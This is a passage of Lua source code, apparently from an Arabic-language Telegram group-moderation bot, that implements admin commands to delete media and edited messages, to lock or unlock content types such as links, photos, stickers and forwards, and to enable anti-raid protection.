if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevAbs:scard(Venom.."Abs:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙عدد الميديا ↫ "..M.."\n𖠧︙الحذف التلقائي ↫ "..(DevAbs:get(Venom..'Abs:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لاتوجد ميديا هنا", 1, 'md') 
end end
if text == "امسح" and ChCheck(msg) or text == "احذف" and ChCheck(msg) or text == "تنظيف ميديا" and ChCheck(msg) or text == "تنظيف الميديا" and ChCheck(msg) then
local List = DevAbs:smembers(Venom.."Abs:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حذف "..Del.." من الميديا", 1, 'md') 
DevAbs:del(Venom.."Abs:cleaner"..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
end
--     Source Venom     --
if Admin(msg) then
if text == "تنظيف تعديل" or text == "تنظيف التعديل" and ChCheck(msg) then   
Abs_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Abs_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Abs_Del},function(arg,data)
new = 0
Abs_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Abs_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Abs_Del2)
end,nil)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
--     Source Venom     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^فتح (.*)$") then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "التعديل" then
if DevAbs:get(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح التعديل")  
DevAbs:del(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙التعديل بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التعديل الميديا" or UnLockText[2] == "تعديل الميديا" then
if DevAbs:get(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح تعديل الميديا")  
DevAbs:del(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه" then
if DevAbs:get(Venom..'Abs:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الفارسيه")  
DevAbs:del(Venom..'Abs:Lock:Farsi'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفشار" then
if not DevAbs:get(Venom..'Abs:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الفشار")  
DevAbs:set(Venom..'Abs:Lock:Fshar'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الفشار بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الطائفيه" then
if not DevAbs:get(Venom..'Abs:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الطائفيه")  
DevAbs:set(Venom..'Abs:Lock:Taf'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكفر" then
if not DevAbs:get(Venom..'Abs:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الكفر")  
DevAbs:set(Venom..'Abs:Lock:Kfr'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الكفر بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه بالطرد" then
if DevAbs:get(Venom..'Abs:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الفارسيه بالطرد")  
DevAbs:del(Venom..'Abs:Lock:FarsiBan'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
end
end
if UnLockText[2] == "البوتات" or UnLockText[2] == "البوتات بالطرد" or UnLockText[2] == "البوتات بالتقييد" or UnLockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح البوتات")  
DevAbs:del(Venom.."Abs:Lock:Bots"..msg.chat_id_)  
end
if UnLockText[2] == "التكرار" then 
DevAbs:hdel(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevAbs:get(Venom..'Abs:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح التثبيت")  
DevAbs:del(Venom..'Abs:Lock:Pin'..msg.chat_id_)
DevAbs:srem(Venom.."Abs:Lock:Pinpin",msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
end end end
end
end
--     Source Venom     --
if Admin(msg) then
if text and text:match("^قفل (.*)$") then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "الدردشه" then
if not DevAbs:get(Venom..'Abs:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الدردشه")  
DevAbs:set(Venom..'Abs:Lock:Text'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الدردشه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاونلاين" then
if not DevAbs:get(Venom..'Abs:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الاونلاين")  
DevAbs:set(Venom..'Abs:Lock:Inline'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصور" then
if not DevAbs:get(Venom..'Abs:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الصور")  
DevAbs:set(Venom..'Abs:Lock:Photo'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الصور بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكلايش" then
if not DevAbs:get(Venom..'Abs:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الكلايش")  
DevAbs:set(Venom..'Abs:Lock:Spam'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الكلايش بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الدخول" then
if not DevAbs:get(Venom..'Abs:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الدخول")  
DevAbs:set(Venom..'Abs:Lock:Join'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الدخول بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفيديو" then
if not DevAbs:get(Venom..'Abs:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الفيديو")  
DevAbs:set(Venom..'Abs:Lock:Videos'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الفيديو بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "المتحركه" then
if not DevAbs:get(Venom..'Abs:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل المتحركه")  
DevAbs:set(Venom..'Abs:Lock:Gifs'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المتحركه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاغاني" then
if not DevAbs:get(Venom..'Abs:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الاغاني")  
DevAbs:set(Venom..'Abs:Lock:Music'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الاغاني بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصوت" then
if not DevAbs:get(Venom..'Abs:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الصوت")  
DevAbs:set(Venom..'Abs:Lock:Voice'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الصوت بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الروابط" then
if not DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الروابط")  
DevAbs:set(Venom..'Abs:Lock:Links'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الروابط بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المواقع" then
if not DevAbs:get(Venom..'Abs:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل المواقع")  
DevAbs:set(Venom..'Abs:Lock:Location'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المواقع بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
if not DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل المعرفات")  
DevAbs:set(Venom..'Abs:Lock:Tags'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المعرفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملفات" then
if not DevAbs:get(Venom..'Abs:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الملفات")  
DevAbs:set(Venom..'Abs:Lock:Document'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الملفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
if not DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الهاشتاك")  
DevAbs:set(Venom..'Abs:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الجهات" then
if not DevAbs:get(Venom..'Abs:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الجهات")  
DevAbs:set(Venom..'Abs:Lock:Contact'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '️𖠧︙الجهات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الشبكات" then
if not DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الشبكات")  
DevAbs:set(Venom..'Abs:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الشبكات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "العربيه" then
if not DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل العربيه")  
DevAbs:set(Venom..'Abs:Lock:Arabic'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العربيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الانكليزيه" then
if not DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الانكليزيه")  
DevAbs:set(Venom..'Abs:Lock:English'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الانكليزيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملصقات" then
if not DevAbs:get(Venom..'Abs:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الملصقات")  
DevAbs:set(Venom..'Abs:Lock:Stickers'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الملصقات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الماركداون" then
if not DevAbs:get(Venom..'Abs:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الماركداون")  
DevAbs:set(Venom..'Abs:Lock:Markdown'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الماركداون بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاشعارات" then
if not DevAbs:get(Venom..'Abs:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الاشعارات")  
DevAbs:set(Venom..'Abs:Lock:TagServr'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "التوجيه" then
if not DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل التوجيه")  
DevAbs:set(Venom..'Abs:Lock:Forwards'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙التوجيه بالفعل مقفل في المجموعه', 1, 'md')
end
end
end
end
--     Source Venom     --
if Admin(msg) then
if text and text:match("^فتح (.*)$") then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "الدردشه" then
if DevAbs:get(Venom..'Abs:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الدردشه")  
DevAbs:del(Venom..'Abs:Lock:Text'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصور" then
if DevAbs:get(Venom..'Abs:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الصور")  
DevAbs:del(Venom..'Abs:Lock:Photo'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevAbs:get(Venom..'Abs:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الكلايش")  
DevAbs:del(Venom..'Abs:Lock:Spam'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الدخول" then
if DevAbs:get(Venom..'Abs:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الدخول")  
DevAbs:del(Venom..'Abs:Lock:Join'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الدخول بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفيديو" then
if DevAbs:get(Venom..'Abs:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الفيديو")  
DevAbs:del(Venom..'Abs:Lock:Videos'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملفات" then
if DevAbs:get(Venom..'Abs:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الملفات")  
DevAbs:del(Venom..'Abs:Lock:Document'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاونلاين" then
if DevAbs:get(Venom..'Abs:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الاونلاين")  
DevAbs:del(Venom..'Abs:Lock:Inline'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الماركداون" then
if DevAbs:get(Venom..'Abs:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الماركداون")  
DevAbs:del(Venom..'Abs:Lock:Markdown'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المتحركه" then
if DevAbs:get(Venom..'Abs:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح المتحركه")  
DevAbs:del(Venom..'Abs:Lock:Gifs'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاغاني" then
if DevAbs:get(Venom..'Abs:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الاغاني")  
DevAbs:del(Venom..'Abs:Lock:Music'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصوت" then
if DevAbs:get(Venom..'Abs:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الصوت")  
DevAbs:del(Venom..'Abs:Lock:Voice'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الروابط" then
if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الروابط")  
DevAbs:del(Venom..'Abs:Lock:Links'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المواقع" then
if DevAbs:get(Venom..'Abs:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح المواقع")  
DevAbs:del(Venom..'Abs:Lock:Location'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح المعرفات")  
DevAbs:del(Venom..'Abs:Lock:Tags'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الهاشتاك")  
DevAbs:del(Venom..'Abs:Lock:Hashtak'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الجهات" then
if DevAbs:get(Venom..'Abs:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الجهات")  
DevAbs:del(Venom..'Abs:Lock:Contact'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الشبكات" then
if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الشبكات")  
DevAbs:del(Venom..'Abs:Lock:WebLinks'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "العربيه" then
if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح العربيه")  
DevAbs:del(Venom..'Abs:Lock:Arabic'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الانكليزيه" then
if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الانكليزيه")  
DevAbs:del(Venom..'Abs:Lock:English'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الانكليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاشعارات" then
if DevAbs:get(Venom..'Abs:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الاشعارات")  
DevAbs:del(Venom..'Abs:Lock:TagServr'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملصقات" then
if DevAbs:get(Venom..'Abs:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح الملصقات")  
DevAbs:del(Venom..'Abs:Lock:Stickers'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التوجيه" then
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح التوجيه")  
DevAbs:del(Venom..'Abs:Lock:Forwards'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
end
--     Source Venom     --
if text and text:match("^قفل التفليش$") or text and text:match("^تفعيل الحمايه القصوى$") then
if not Constructor(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمنشئين فقط', 1, 'md')
else
DevAbs:set(Venom.."Abs:Lock:Bots"..msg.chat_id_,"del") DevAbs:hset(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Abs:Lock:Links','Abs:Lock:Contact','Abs:Lock:Forwards','Abs:Lock:Videos','Abs:Lock:Gifs','Abs:Lock:EditMsgs','Abs:Lock:Stickers','Abs:Lock:Farsi','Abs:Lock:Spam','Abs:Lock:WebLinks','Abs:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevAbs:set(Venom..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل التفليش")  
end
end
if text and text:match("^فتح التفليش$") then
if not Constructor(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمنشئين فقط', 1, 'md')
else
DevAbs:hdel(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'Abs:Lock:Links','Abs:Lock:Contact','Abs:Lock:Forwards','Abs:Lock:Videos','Abs:Lock:Gifs','Abs:Lock:EditMsgs','Abs:Lock:Stickers','Abs:Lock:Farsi','Abs:Lock:Spam','Abs:Lock:WebLinks','Abs:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
DevAbs:del(Venom..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح التفليش")  
end
end
--     Source Venom     --
if text and text:match("^قفل الكل$") then
if not Constructor(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمنشئين فقط', 1, 'md')
else
DevAbs:del(Venom..'Abs:Lock:Fshar'..msg.chat_id_) DevAbs:del(Venom..'Abs:Lock:Taf'..msg.chat_id_) DevAbs:del(Venom..'Abs:Lock:Kfr'..msg.chat_id_) 
DevAbs:set(Venom.."Abs:Lock:Bots"..msg.chat_id_,"del") DevAbs:hset(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Abs:Lock:EditMsgs','Abs:Lock:Farsi','Abs:Lock:TagServr','Abs:Lock:Inline','Abs:Lock:Photo','Abs:Lock:Spam','Abs:Lock:Videos','Abs:Lock:Gifs','Abs:Lock:Music','Abs:Lock:Voice','Abs:Lock:Links','Abs:Lock:Location','Abs:Lock:Tags','Abs:Lock:Stickers','Abs:Lock:Markdown','Abs:Lock:Forwards','Abs:Lock:Document','Abs:Lock:Contact','Abs:Lock:Hashtak','Abs:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevAbs:set(Venom..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل جميع الاوامر")  
end
end
if text and text:match("^فتح الكل$") then
if not Constructor(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمنشئين فقط', 1, 'md')
else
DevAbs:set(Venom..'Abs:Lock:Fshar'..msg.chat_id_,true) DevAbs:set(Venom..'Abs:Lock:Taf'..msg.chat_id_,true) DevAbs:set(Venom..'Abs:Lock:Kfr'..msg.chat_id_,true) DevAbs:hdel(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'Abs:Lock:EditMsgs','Abs:Lock:Text','Abs:Lock:Arabic','Abs:Lock:English','Abs:Lock:Join','Abs:Lock:Bots','Abs:Lock:Farsi','Abs:Lock:FarsiBan','Abs:Lock:TagServr','Abs:Lock:Inline','Abs:Lock:Photo','Abs:Lock:Spam','Abs:Lock:Videos','Abs:Lock:Gifs','Abs:Lock:Music','Abs:Lock:Voice','Abs:Lock:Links','Abs:Lock:Location','Abs:Lock:Tags','Abs:Lock:Stickers','Abs:Lock:Markdown','Abs:Lock:Forwards','Abs:Lock:Document','Abs:Lock:Contact','Abs:Lock:Hashtak','Abs:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
DevAbs:del(Venom..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم فتح جميع الاوامر")  
end
end
--     Source Venom     --
if Admin(msg) then
if text and (text:match("^ضع سبام (%d+)$") or text:match("^وضع سبام (%d+)$")) then
local SetSpam = text:match("ضع سبام (%d+)$") or text:match("وضع سبام (%d+)$")
